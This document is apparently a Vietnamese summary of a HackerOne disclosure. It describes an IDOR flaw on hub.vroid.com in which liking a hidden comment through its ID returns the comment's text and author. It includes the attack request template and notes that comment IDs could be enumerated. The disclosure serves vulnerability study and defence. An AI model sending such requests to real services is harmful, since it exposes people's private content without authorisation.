# https://hackerone.com/reports/2541962
**Loại lỗi:** Insecure Direct Object Reference (IDOR)


---

## Tóm tắt ngắn gọn

Comment đã bị **ẩn (disable comment)** trên media **vẫn bị lộ nội dung** nếu attacker **gửi request “like comment” với comment ID**.
Backend **không kiểm tra quyền truy cập / trạng thái comment**, dẫn đến **lộ nội dung comment ẩn** qua response API.

---

## Luồng logic đúng vs sai

### Bối cảnh

* UserVictim: đăng media → bật comment → có comment → **tắt comment**
* Comment lúc này: **chỉ admin / owner thấy**

---

## 1️⃣ Request đúng → Response đúng (hành vi mong đợi)

### Request (Attacker like comment đã bị ẩn)

```
POST /api/statuses/COMMENT_ID/hearts
Host: hub.vroid.com
Cookie: ATTACKER_COOKIES
Content-Type: application/json

{}
```

### Response đúng

```
404 Not Found
{
  "error": "COMMON_NOT_FOUND"
}
```

👉 Comment ẩn **không tồn tại với attacker**, không lộ dữ liệu.

---

## 2️⃣ Request bug → Response bug (hành vi sai)

### Request (Attacker đoán / có được comment ID)

```
POST /api/statuses/COMMENT_ID/hearts
Host: hub.vroid.com
Cookie: ATTACKER_COOKIES
Content-Type: application/json

{}
```

### Response bug

```
200 OK
{
  "id": "COMMENT_ID",
  "content": "This is a hidden comment",
  "user": {
    "username": "victim_user"
  },
  "hearts": 1
}
```

👉 **Lộ nội dung + owner của comment ẩn** ❌

---

## Bản chất lỗi

* Endpoint **like comment**:

  * Không check:

    * comment có bị ẩn không
    * requester có quyền xem comment không
* ID comment là **Direct Object Reference**
* Business logic sai: *“Like được” ≠ “Xem được”*

---

## Impact

* Rò rỉ comment riêng tư / đã bị ẩn
* Bypass quyền riêng tư của media
* Có thể enumerate comment ID để leak dữ liệu hàng loạt
